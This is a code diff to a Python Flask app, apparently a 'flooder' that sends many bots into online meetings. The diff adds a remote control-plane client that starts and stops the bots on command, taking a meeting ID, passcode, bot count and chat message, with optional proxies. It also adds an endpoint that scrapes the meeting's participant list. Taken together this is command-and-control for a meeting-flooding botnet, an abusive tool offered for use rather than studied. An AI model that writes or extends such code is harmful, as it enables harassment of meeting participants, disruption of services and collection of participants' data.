@@ -89,6 +89,91 @@ manager.on_bot_update = _on_bot_update
 manager.on_stats_update = _on_stats_update
 
 
+# ── ZMT Control Plane integration ────────────────────────────────────────────
+_zmt_cp = None
+
+def _init_zmt_cp():
+    global _zmt_cp
+    integration = load_integration_config()
+    if not integration.get("zmt_enabled"):
+        return
+    cp_url = integration.get("zmt_cp_url", "")
+    if not cp_url:
+        return
+    try:
+        from zmt_client import ZMTClient
+        _zmt_cp = ZMTClient(
+            server_url=cp_url,
+            registration_key=integration.get("zmt_registration_key", ""),
+            bot_name=integration.get("zmt_agent_name") or f"flooder-{__import__('platform').node()}",
+            bot_mode="flooder",
+            version="1.0",
+            on_command=_handle_zmt_command,
+            log_func=lambda msg, lvl="info": log.info(msg) if lvl != "warn" else log.warning(msg),
+        )
+        _zmt_cp.connect()
+        log.info("ZMT Control Plane client started")
+    except Exception as e:
+        log.warning(f"ZMT CP init failed: {e}")
+
+
+def _handle_zmt_command(command):
+    """Handle commands from ZMT Control Plane (Deploy Flooder, Stop, Status)."""
+    action = command.get("action", "")
+    command_id = command.get("commandId", "")
+    params = command.get("params", command.get("data", {}))
+
+    if action == "flooder:start":
+        try:
+            cfg = build_config(
+                meeting_id=params.get("meeting_id", ""),
+                passcode=params.get("passcode", ""),
+                thread_count=int(params.get("thread_count", 1)),
+                num_bots=int(params.get("num_bots", 1)),
+                custom_name=params.get("custom_name", ""),
+                use_proxies=bool(params.get("use_proxies", False)),
+                chat_recipient=params.get("chat_recipient", ""),
+                chat_message=params.get("chat_message", ""),
+            )
+            manager.start(cfg)
+            if _zmt_cp:
+                _zmt_cp.send_command_response(command_id, True, {"message": "Flooder started"})
+            log.info(f"ZMT: Flooder started via control plane")
+        except Exception as e:
+            log.error(f"ZMT flooder start error: {e}")
+            if _zmt_cp:
+                _zmt_cp.send_command_response(command_id, False, error=str(e))
+
+    elif action == "flooder:stop":
+        manager.stop()
+        if _zmt_cp:
+            _zmt_cp.send_command_response(command_id, True, {"message": "Flooder stopped"})
+        log.info("ZMT: Flooder stopped via control plane")
+
+    elif action == "flooder:status":
+        stats = _serialize_stats(manager.get_stats())
+        if _zmt_cp:
+            _zmt_cp.send_command_response(command_id, True, stats)
+
+    elif action == "ping":
+        if _zmt_cp:
+            _zmt_cp.send_command_response(command_id, True, {"pong": True})
+
+
+# Wire stats updates to also push to ZMT
+_original_on_stats = _on_stats_update
+
+def _on_stats_update_with_zmt(stats):
+    _original_on_stats(stats)
+    if _zmt_cp and _zmt_cp.is_connected:
+        _zmt_cp.send_event("flooder:stats", _serialize_stats(stats))
+
+manager.on_stats_update = _on_stats_update_with_zmt
+
+# Initialize ZMT CP (non-blocking)
+_init_zmt_cp()
+
+
 # ── Flask routes ─────────────────────────────────────────────────────────────
 @app.route("/")
 def index():
@@ -103,6 +188,27 @@ def api_defaults():
 @app.route("/api/status")
 def api_status():
     return jsonify(_serialize_stats(manager.get_stats()))
+
+
+@app.route("/api/participants")
+def api_participants():
+    """Get participant list from the first active bot (fiber + DOM fallback)."""
+    from bot import get_participants, get_participant_count
+    drivers = list(manager._active_drivers) if hasattr(manager, '_active_drivers') else []
+    if not drivers:
+        return jsonify({"participants": [], "badge_count": 0, "error": "No active bots"})
+    bot_id_1, driver = drivers[0]
+    try:
+        badge = get_participant_count(driver)
+        plist = get_participants(driver, bot_id_1 - 1)
+        return jsonify({
+            "participants": plist,
+            "list_count": len(plist),
+            "badge_count": badge,
+            "complete": len(plist) >= badge if badge > 0 else True,
+        })
+    except Exception as exc:
+        return jsonify({"participants": [], "badge_count": 0, "error": str(exc)})
 
 
 SCREENSHOT_DIR = os.path.join(os.path.dirname(__file__), "screenshots")
